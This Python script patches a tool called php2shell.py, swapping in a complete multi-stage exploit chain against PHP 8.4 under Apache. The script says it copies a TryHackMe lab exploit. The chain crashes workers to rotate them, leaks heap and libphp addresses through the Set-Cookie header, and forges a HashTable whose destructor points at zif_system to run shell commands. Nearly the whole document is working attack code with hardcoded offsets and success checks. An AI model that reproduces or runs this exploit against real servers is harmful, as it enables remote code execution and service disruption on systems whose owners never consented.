import sys
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

with open('php2shell.py', 'r', encoding='utf-8') as f:
    src = f.read()

# Find Chain X block boundaries
cstart_marker = '# ═══════════════════════════════════════════════════════════════════════\n# CHAIN X: ASLR BYPASS'
cstart = src.find(cstart_marker)
if cstart == -1:
    # Find by function name
    cstart = src.find('def exploit_chain_x')
    cstart = src.rfind('# ═══', 0, cstart)
end_marker = 'def exploit_chain_a_universal'
end = src.find(end_marker)

if cstart == -1 or end == -1:
    print(f'ERROR: cstart={cstart}, end={end}')
    sys.exit(1)

print(f'Replacing Chain X block: {cstart} to {end} ({end-cstart} bytes)')

# New Chain X implementation — replicates the room's proven exploit.py technique
new_chain_x = '''# ═══════════════════════════════════════════════════════════════════════
# CHAIN X: ASLR BYPASS — Set-Cookie heap leak → libphp leak → corruption
# Replicates the proven exploit.py technique from the THM lab:
#   stage 0  HTTP worker rotation
#   stage 1  Set-Cookie heap leak        → Zend MM chunk base
#   stage 2  Set-Cookie libphp leak      → libphp base (ZVAL_PTR_DTOR)
#   stage 3  upload_progress fake-ref    → pDestructor = zif_system → RCE
# ═══════════════════════════════════════════════════════════════════════

X_SID = b"attacksessionid0001"
X_ZIF_OFFSET = 0x465370       # zif_system (php:8.4.26-apache/bookworm)
X_DTOR_OFFSET = 0x613C50      # zval_ptr_dtor
X_HTDATA_OFFSET = 0x690D8     # live 167-byte string (bookworm)
X_MAX_CMD = 14


def _x_post(target, path, body, boundary, read_cap=1<<20, timeout=90):
    """Raw POST with concurrent read (worker may abort mid-body)."""
    boundary_str = boundary.decode() if isinstance(boundary, bytes) else boundary
    hdr = (
        f"POST {path} HTTP/1.1\\r\\n"
        f"Host: {target.host}\\r\\n"
        f"Content-Type: multipart/form-data; boundary={boundary_str}\\r\\n"
        f"Content-Length: {len(body)}\\r\\n"
        f"Connection: close\\r\\n\\r\\n"
    ).encode()
    try:
        sock = socket.create_connection((target.host, target.port), timeout=timeout)
        if target.tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=target.host)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except OSError:
        return b""

    data = bytearray()
    def reader():
        try:
            while len(data) < read_cap:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                data.extend(chunk)
        except OSError:
            pass

    import threading as _th
    t = _th.Thread(target=reader, daemon=True)
    t.start()
    try:
        try:
            sock.sendall(hdr)
            mv = memoryview(body)
            for off in range(0, len(body), 262144):
                sock.sendall(mv[off:off + 262144])
        except OSError:
            pass  # worker may abort mid-body
        t.join(timeout=timeout + 1.0)
    finally:
        sock.close()
    return bytes(data)


def _x_multipart(parts, boundary):
    """Build multipart body from parts list."""
    out = bytearray()
    for p in parts:
        name = p["name"].encode() if isinstance(p["name"], str) else p["name"]
        out += b"--" + boundary + b"\\r\\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        fn = p.get("filename")
        if fn is not None:
            out += b'; filename="' + fn.encode() + b'"'
            out += b"\\r\\nContent-Type: application/octet-stream"
        out += b"\\r\\n\\r\\n" + p["data"] + b"\\r\\n"
    out += b"--" + boundary + b"--\\r\\n"
    return bytes(out)


def _x_parse_cookie(resp):
    """Extract PHPSESSID value from Set-Cookie header."""
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\\r\\n]*?); path=/", resp)
    if not m:
        return b""
    from urllib.parse import unquote_to_bytes
    return unquote_to_bytes(m.group(1).decode("latin1"))


def _x_chunk_base(raw):
    """Stage 1: 2MB-aligned mode of heap pointers in the decoded cookie."""
    if len(raw) < 1000:
        return 0
    from collections import Counter
    c = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x600000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 8 else 0


def _x_libphp_base(raw, dtor_offset=X_DTOR_OFFSET):
    """Stage 2: pDestructor at cookie offset 8:16 → libphp base."""
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x600000000000 <= p < 0x800000000000):
        return 0
    if p & 0xFFF != dtor_offset & 0xFFF:
        return 0
    base = p - dtor_offset
    return base if base & 0xFFF == 0 else 0


def _x_rotate(target, path):
    """Abort the current worker; prefork forks a fresh one."""
    # Kill: 1001 fields × 3KB + 12MB big field → OOM → worker dies
    parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (12 * 1024 * 1024)},
    ]
    _x_post(target, path, _x_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1<<20)
    time.sleep(0.3)
    # Trigger cleanup on fresh worker (pre-RINIT walks corrupted heap → abort)
    parts2 = [
        {"name": "PHPSESSID", "data": X_SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    _x_post(target, path, _x_multipart(parts2, b"BNDRY12345"), b"BNDRY12345", read_cap=65536, timeout=20)
    time.sleep(0.5)


def _x_stage1(target, path, n=892):
    """Heap leak: n fields with 48-byte values + forged zend_string → Set-Cookie."""
    # Prime: fill heap with 1001 small fields
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (12 * 1024 * 1024)},
    ]
    _x_post(target, path, _x_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1<<20)
    time.sleep(0.2)

    # Leak request: specific field count + forged zend_string (len=0x1000)
    parts = [
        {"name": "PHPSESSID", "data": X_SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(n):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)  # forged zend_string len
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})

    resp = _x_post(target, path, _x_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9<<20)
    return _x_chunk_base(_x_parse_cookie(resp))


def _x_stage2(target, path, t_idx=406, vlen=16):
    """libphp leak: 983 array fields (one with 16 sub-arrays) → Set-Cookie."""
    # Prime
    parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (12 * 1024 * 1024)},
    ]
    _x_post(target, path, _x_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1<<20)
    time.sleep(0.2)

    # Leak request: array fields, one with 16 sub-elements at t_idx
    parts = [
        {"name": "PHPSESSID", "data": X_SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(983):
        cnt = 16 if i == t_idx else 1
        for j in range(cnt):
            parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * vlen})

    resp = _x_post(target, path, _x_multipart(parts, b"B" * 10), b"B" * 10, read_cap=1<<20)
    return _x_libphp_base(_x_parse_cookie(resp))


def _x_stage3(target, path, heap_base, libphp_base, command):
    """Corruption: fake HashTable with pDestructor=zif_system → system(cmd)."""
    zif = libphp_base + X_ZIF_OFFSET
    htdata = heap_base + X_HTDATA_OFFSET
    cmd = command.encode()[:X_MAX_CMD]

    # 167-byte fake HashTable
    ht = bytearray(b"\\x00" * 167)
    struct.pack_into("<II", ht, 0x00, 1, 7)               # gc: rc=1, IS_ARRAY
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)   # flags, nTableMask
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)       # arData
    struct.pack_into("<II", ht, 0x18, 1, 1)               # nNumUsed/OfElements
    struct.pack_into("<II", ht, 0x20, 8, 0)               # nTableSize/pointer
    struct.pack_into("<Q", ht, 0x28, 0)                   # nNextFreeElement
    struct.pack_into("<Q", ht, 0x30, zif)                 # pDestructor = zif_system!
    # fake execute_data at E = data+0x20
    E = 0x20
    struct.pack_into("<Q", ht, E + 0x00, 0)               # opline
    struct.pack_into("<Q", ht, E + 0x08, 0)               # call
    struct.pack_into("<Q", ht, E + 0x10, zif)             # return_value
    struct.pack_into("<Q", ht, E + 0x18, 0)               # func
    struct.pack_into("<Q", ht, E + 0x20, 0)               # This.value
    struct.pack_into("<I", ht, E + 0x28, 0)               # This.u1.type_info
    struct.pack_into("<I", ht, E + 0x2C, 1)               # num_args = 1
    struct.pack_into("<Q", ht, E + 0x30, 0)               # prev_execute_data
    struct.pack_into("<Q", ht, E + 0x38, 0)               # symbol_table
    struct.pack_into("<I", ht, E + 0x40, 0)               # call_info
    struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)   # arg1 value
    struct.pack_into("<I", ht, E + 0x58, 6)               # arg1 IS_STRING
    # fake zend_string at data+0x80
    struct.pack_into("<II", ht, 0x80, 1, 0x106)           # gc rc=1, IS_STRING
    struct.pack_into("<Q", ht, 0x88, 0)                   # h
    struct.pack_into("<Q", ht, 0x90, len(cmd))            # len
    ht[0x98:0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0

    # fake reference (55 bytes)
    ref = bytearray(b"X" * 55)
    struct.pack_into("<II", ref, 0x10, 1, 10)             # IS_REFERENCE
    struct.pack_into("<Q", ref, 0x18, htdata)             # val.value
    struct.pack_into("<Q", ref, 0x20, 0x307)              # IS_ARRAY_EX

    # Prime + send corruption
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (12 * 1024 * 1024)},
    ]
    _x_post(target, path, _x_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1<<20)
    time.sleep(0.2)

    # Corruption request
    parts = [
        {"name": "PHPSESSID", "data": X_SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "1999", "data": bytes(ht)},   # fake HashTable
        {"name": "pad0", "data": bytes(ref)},  # fake reference
    ]
    resp = _x_post(target, path, _x_multipart(parts, b"B" * 10), b"B" * 10, read_cap=1<<20)
    return resp


def exploit_chain_x(target: TargetInfo, command: str = "id",
                    path: str = "/index.php",
                    attempts: int = 3) -> ExploitResult:
    """Chain X: ASLR Bypass — Set-Cookie heap leak + libphp leak + corruption.
    Replicates the proven exploit.py technique: the technique that WORKS."""
    print(f"{C.RED}{C.BOLD}── Chain X: ASLR Bypass (Set-Cookie leak → corruption → RCE) ──{C.RESET}")
    print(f"    Target : {target.host}:{target.port}")
    print(f"    PHP    : {target.php_version or 'unknown'}")
    print(f"    Tech   : Set-Cookie heap leak + worker rotation + fake pDestructor")

    if len(command) > X_MAX_CMD:
        warn(f"Command > {X_MAX_CMD} bytes — truncating (carrier limit)")
        command = command[:X_MAX_CMD]

    for attempt in range(1, attempts + 1):
        step(attempt, attempts, "ASLR bypass...")

        # Stage 0: Rotate worker
        info("Stage 0: Rotating worker...")
        _x_rotate(target, path)

        # Stage 1: Heap leak
        info("Stage 1: Heap leak (Set-Cookie)...")
        for n in (892, 841, 900, 870):
            heap_base = _x_stage1(target, path, n)
            if heap_base:
                break
        if not heap_base:
            warn("  Heap leak failed — rotating and retrying...")
            continue
        ok(f"  Heap chunk base = 0x{heap_base:x}")

        # Stage 2: libphp leak
        info("Stage 2: libphp leak (Set-Cookie)...")
        _x_rotate(target, path)
        for t_idx in (406, 400, 410, 390, 420):
            for vlen in (16, 1):
                libphp_base = _x_stage2(target, path, t_idx, vlen)
                if libphp_base:
                    break
            if libphp_base:
                break
        if not libphp_base:
            warn("  libphp leak failed — rotating and retrying...")
            continue
        ok(f"  libphp base = 0x{libphp_base:x}")

        # Stage 3: Corruption + RCE
        zif = libphp_base + X_ZIF_OFFSET
        htdata = heap_base + X_HTDATA_OFFSET
        info(f"Stage 3: ZIF=0x{zif:x} HTDATA=0x{htdata:x}")
        info(f"Stage 3: Sending corruption (pDestructor = zif_system)...")
        resp = _x_stage3(target, path, heap_base, libphp_base, command)

        # Verify RCE
        if resp:
            body = resp.split(b"\\r\\n\\r\\n", 1)[-1] if b"\\r\\n\\r\\n" in resp else resp
            if b"uid=" in body or b"www-data" in body or b"PROOF" in body:
                out = body.decode("latin-1", "replace")[:300]
                critical(f"CHAIN X SUCCESS! Output: {out}")
                return ExploitResult(Chain.X_ASLR_BYPASS, True, out, {
                    "heap_base": heap_base, "libphp_base": libphp_base,
                    "zif": zif, "attempt": attempt, "command": command})

        # Also check via follow-up GET
        info("Stage 4: Verifying via follow-up request...")
        resp2 = send_http(target.host, target.port, "GET", path, target.tls, timeout=15)
        if resp2:
            body2 = resp2.split(b"\\r\\n\\r\\n", 1)[-1] if b"\\r\\n\\r\\n" in resp2 else resp2
            if b"uid=" in body2 or b"www-data" in body2:
                critical("CHAIN X SUCCESS via verification!")
                return ExploitResult(Chain.X_ASLR_BYPASS, True,
                                     body2.decode("latin-1", "replace")[:200],
                                     {"heap_base": heap_base, "libphp_base": libphp_base})

    fail(f"Chain X: ASLR bypass failed in {attempts} attempts")
    return ExploitResult(Chain.X_ASLR_BYPASS, False,
                         "ASLR bypass failed", {"attempts": attempts})


'''

src = src[:cstart] + new_chain_x + src[end:]

with open('php2shell.py', 'w', encoding='utf-8') as f:
    f.write(src)

print(f'Chain X replaced successfully!')
print(f'New file size: {len(src):,} bytes')
